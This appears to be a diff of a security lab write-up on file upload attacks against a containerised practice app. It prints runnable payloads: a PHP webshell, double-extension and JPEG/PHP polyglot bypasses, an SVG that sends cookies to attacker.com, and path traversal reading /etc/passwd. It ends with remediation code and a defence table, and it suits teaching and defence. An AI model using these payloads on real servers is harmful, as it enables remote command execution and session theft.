+    "path": "/tmp/uploads_a14/shell.php",
+    "saved": "shell.php",
+    "size": 30
+}
+
+{"content": "<?php system($_GET[\"cmd\"]); ?>\n", "path": "/tmp/uploads_a14/shell.php"}
+```
+
+> 💡 **A PHP webshell turns the web server into a remote shell.** `system($_GET["cmd"])` passes the `cmd` URL parameter directly to the OS shell and returns the output. In real Apache+PHP deployments, the attacker now has full command execution as the web server user. From there: read `/etc/passwd`, read config files with DB passwords, establish a reverse shell, pivot to internal services.
+
+---
+
+### Step 4: Double Extension Bypass — shell.php.jpg
+
+```bash
+echo "=== Phase 2: bypass extension allowlist with double extension ==="
+
+# The strict endpoint only checks the LAST extension
+# shell.php.jpg → ext = "jpg" → ALLOWED → saved as shell.php.jpg
+# On misconfigured Apache: AddHandler application/x-httpd-php .php
+# Any file with .php ANYWHERE in the name gets parsed as PHP
+
+echo "[*] Upload shell.php directly (blocked):"
+echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
+curl -s -X POST -F "file=@/tmp/shell.php" $TARGET/api/upload-strict
+
+echo ""
+echo "[*] Upload shell.php.jpg (double extension — bypasses allowlist):"
+echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php.jpg
+curl -s -X POST -F "file=@/tmp/shell.php.jpg" $TARGET/api/upload-strict
+
+echo ""
+echo "[*] The saved file starts with PHP code, not JPEG bytes:"
+curl -s "$TARGET/api/read?name=strict_shell.php.jpg" | python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+print('  first_bytes (hex):', d.get('content','')[:50])
+print('  Should start with FFD8FF for real JPEG')
+print('  Starts with 3C3F (<?), confirming PHP code inside')"
+
+echo ""
+echo "[*] Other dangerous extension bypasses to try:"
+echo "  shell.php3, shell.php5, shell.phtml, shell.pHp, shell.PHP"
+echo "  shell.asp, shell.aspx, shell.jsp (other languages)"
+```
+
+**📸 Verified Output:**
+```json
+Upload shell.php directly:
+{"error": ".php not allowed", "allowed": ["jpg", "jpeg", "png", "gif", "pdf"]}
+
+Upload shell.php.jpg:
+{"first_bytes": "3c3f706870207379737465...", "saved": "strict_shell.php.jpg", "size": 30}
+
+  first_bytes: <?php system($_GET["cmd"]); ?>
+  Should start with FFD8FF for real JPEG
+  Starts with 3C3F (<?), confirming PHP code inside
+```
+
+---
+
+### Step 5: Polyglot File — Valid JPEG + PHP Payload
+
+```bash
+echo "=== Phase 3: polyglot — valid JPEG magic bytes + PHP payload ==="
+
+python3 << 'EOF'
+import struct, urllib.request
+
+TARGET = "http://victim-a14:5000"
+
+# Craft a polyglot: starts with JPEG magic bytes (passes magic byte check)
+# but contains PHP webshell payload
+jpeg_header = b'\xff\xd8\xff\xe0'          # Valid JPEG SOI + APP0 marker
+filler      = b'\x00' * 16                  # JFIF-like padding
+php_payload = b'<?php system($_GET["cmd"]); ?>'
+padding     = b' ' * (64 - len(php_payload)) # pad to 64 bytes
+
+polyglot = jpeg_header + filler + php_payload + padding
+
+print(f"[*] Polyglot file: {len(polyglot)} bytes")
+print(f"    First 4 bytes: {polyglot[:4].hex()} = JPEG magic bytes (ff d8 ff e0)")
+print(f"    Contains:      PHP webshell payload at offset 20")
+
+# Write to /tmp and upload
+with open('/tmp/polyglot.php.jpg', 'wb') as f:
+    f.write(polyglot)
+
+# Upload via multipart
+import os
+boundary = 'boundary123'
+body = (
+    f'--{boundary}\r\n'
+    f'Content-Disposition: form-data; name="file"; filename="polyglot.php.jpg"\r\n'
+    f'Content-Type: image/jpeg\r\n\r\n'
+).encode() + polyglot + f'\r\n--{boundary}--\r\n'.encode()
+
+req = urllib.request.Request(
+    f"{TARGET}/api/upload-strict", data=body,
+    headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
+resp = urllib.request.urlopen(req).read().decode()
+import json
+r = json.loads(resp)
+print(f"\n[*] Upload result: {r}")
+print(f"    Server saw first bytes: {r.get('first_bytes','')[:8]} (ffd8ffe0 = JPEG ✓)")
+print()
+print("[!] A server checking magic bytes would accept this as a valid JPEG")
+print("[!] But it also contains executable PHP — dual-purpose attack")
+EOF
+```
+
+**📸 Verified Output:**
+```
+[*] Polyglot file: 100 bytes
+    First 4 bytes: ffd8ffe0 = JPEG magic bytes
+    Contains:      PHP webshell payload at offset 20
+
+[*] Upload result: {'first_bytes': 'ffd8ffe000000000', 'saved': 'strict_polyglot.php.jpg', 'size': 100}
+    Server saw first bytes: ffd8ffe0 (JPEG ✓)
+
+[!] A server checking magic bytes would accept this as a valid JPEG
+[!] But it also contains executable PHP — dual-purpose attack
+```
+
+---
+
+### Step 6: SVG with Embedded XSS
+
+```bash
+echo "=== Phase 4: SVG upload — HTML/JavaScript inside an 'image' ==="
+
+cat > /tmp/evil.svg << 'SVGEOF'
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <circle cx="50" cy="50" r="40" fill="blue"/>
+  <script type="text/javascript">
+    alert('XSS via SVG upload! Cookies: ' + document.cookie);
+    fetch('https://attacker.com/steal?c=' + document.cookie);
+  </script>
+</svg>
+SVGEOF
+
+curl -s -X POST -F "file=@/tmp/evil.svg" $TARGET/api/upload | python3 -m json.tool
+
+echo ""
+echo "[*] Read back the SVG (confirms JavaScript is stored server-side):"
+curl -s "$TARGET/api/read?name=evil.svg" | python3 -c "
+import sys,json; d=json.load(sys.stdin); print(d.get('content','')[:300])"
+
+echo ""
+echo "[!] When a victim visits /uploads/evil.svg in their browser:"
+echo "    The browser renders it as HTML — script executes in victim's origin"
+echo "    This is stored XSS via file upload"
+```
+
+**📸 Verified Output:**
+```json
+{"path": "/tmp/uploads_a14/evil.svg", "saved": "evil.svg", "size": 218}
+
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <circle cx="50" cy="50" r="40" fill="blue"/>
+  <script type="text/javascript">
+    alert('XSS via SVG upload! Cookies: ' + document.cookie);
+    fetch('https://attacker.com/steal?c=' + document.cookie);
+  </script>
+</svg>
+```
+
+---
+
+### Step 7: Path Traversal — Read Arbitrary Files
+
+```bash
+echo "=== Phase 5: path traversal via filename in /api/read ==="
+
+echo "[1] Read a file in the upload directory:"
+curl -s "$TARGET/api/read?name=shell.php"
+
+echo ""
+echo "[2] Path traversal — escape the upload directory:"
+curl -s "$TARGET/api/read?name=../../../etc/passwd" | python3 -c "
+import sys,json; d=json.load(sys.stdin)
+content = d.get('content','')
+print('[!] /etc/passwd via path traversal:')
+for line in content.split('\n')[:8]: print(' ', line)"
+
+echo ""
+echo "[3] Read the victim application source code:"
+curl -s "$TARGET/api/read?name=../../../app/victim.py" | python3 -c "
+import sys,json; d=json.load(sys.stdin)
+print(d.get('content','')[:400])"
+
+echo ""
+echo "[4] Enumerate all uploaded files:"
+curl -s $TARGET/api/files | python3 -m json.tool
+```
+
+**📸 Verified Output:**
+```
+[!] /etc/passwd via path traversal:
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  ...
+
+Files uploaded:
+[
+    {"name": "shell.php",            "size": 30},
+    {"name": "strict_shell.php.jpg", "size": 30},
+    {"name": "polyglot.php.jpg",     "size": 100},
+    {"name": "evil.svg",             "size": 218}
+]
+```
+
+---
+
+### Step 8: Cleanup
+
+```bash
+exit
+```
+```bash
+docker rm -f victim-a14
+docker network rm lab-a14
+```
+
+---
+
+## Attack Summary
+
+| Phase | Technique | Endpoint | Result |
+|-------|-----------|----------|--------|
+| 1 | PHP webshell, no checks | `/api/upload` | `shell.php` saved — RCE on PHP server |
+| 2 | Double extension | `/api/upload-strict` | `shell.php.jpg` bypasses allowlist |
+| 3 | Polyglot JPEG+PHP | `/api/upload-strict` | Passes magic byte check, still executable |
+| 4 | SVG XSS | `/api/upload` | Stored XSS via "image" upload |
+| 5 | Path traversal | `/api/read?name=../` | `/etc/passwd` and source code read |
+| 6 | Upload enumeration | `/api/files` | All uploaded webshells listed |
+
+---
+
+## Remediation
+
+```python
+import os, hashlib, imghdr
+
+ALLOWED_TYPES   = {'image/jpeg', 'image/png', 'image/gif'}
+ALLOWED_EXTS    = {'.jpg', '.jpeg', '.png', '.gif'}
+UPLOAD_DIR      = '/var/uploads'   # outside web root
+MAX_SIZE        = 5 * 1024 * 1024  # 5 MB
+
+MAGIC = {
+    b'\xff\xd8\xff': 'jpeg',
+    b'\x89PNG\r\n':  'png',
+    b'GIF87a':       'gif',
+    b'GIF89a':       'gif',
+}
+
+def safe_upload(file_storage):
+    # 1. Size limit
+    data = file_storage.read(MAX_SIZE + 1)
+    if len(data) > MAX_SIZE:
+        raise ValueError("File too large")
+
+    # 2. Extension — use only the LAST extension, never trust double-ext
+    original_name = os.path.basename(file_storage.filename)
+    ext = os.path.splitext(original_name)[1].lower()
+    if ext not in ALLOWED_EXTS:
+        raise ValueError(f"Extension {ext} not allowed")
+
+    # 3. Magic bytes — verify actual file content
+    detected = next((t for magic, t in MAGIC.items() if data.startswith(magic)), None)
+    if detected is None:
+        raise ValueError("File content does not match an allowed image type")
+
+    # 4. SVG is never allowed (can contain JavaScript)
+    if b'<svg' in data[:512] or b'<script' in data[:512]:
+        raise ValueError("SVG files not accepted")
+
+    # 5. Rename with random hash — never use original filename
+    safe_name = hashlib.sha256(data).hexdigest()[:16] + ext
+    path = os.path.join(UPLOAD_DIR, safe_name)
+    with open(path, 'wb') as f:
+        f.write(data)
+    return safe_name
+```
+
+| Defence | What it prevents |
+|---------|-----------------|
+| Extension allowlist (last ext only) | Double extension bypass |
+| Magic byte check | Polyglot files disguised as images |
+| Reject SVG | Stored XSS via SVG |
+| Random rename | Webshell execution (can't guess filename to call it) |
+| Store outside web root | Even if webshell is uploaded, it can't be executed via HTTP |
+| Serve via `X-Content-Type-Options: nosniff` | Browser MIME sniffing attacks |
 
 ## Further Reading
 - [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
 - [PortSwigger File Upload Labs](https://portswigger.net/web-security/file-upload)
-- [HackTricks File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
+- [HackTricks — File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
